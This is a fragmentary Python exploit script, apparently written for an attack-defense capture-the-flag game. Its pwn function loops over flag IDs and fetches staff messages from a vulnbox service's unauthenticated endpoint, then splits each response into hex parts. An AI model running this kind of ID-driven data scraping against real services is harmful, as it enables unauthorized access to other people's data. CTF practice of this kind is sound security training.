...
def pwn(target_num, flag_ids, ):
    ...
    for x in target_flag_ids:
        uname = x[14:30]
        message = s.get(f'http://[{vulnbox_ip}]:{SERVICE_PORT}/staff/message/{uname}')
        response_dict = json.loads(message.content.decode('utf-8'))
        msg = response_dict["message"]
        part1, part2, part3 = split_string_into_3_parts(msg)
...
def split_string_into_3_parts(input_string):
    # Calculate the length of the string
    str_length = len(input_string)
    
    # Calculate the length of each part
    part_length = str_length // 3
    
    # Extract the three equal parts
    part1 = input_string[:part_length]
    part2 = input_string[part_length:2 * part_length]
    part3 = input_string[2 * part_length:]
    
    return bytes.fromhex(part1), bytes.fromhex(part2), bytes.fromhex(part3)
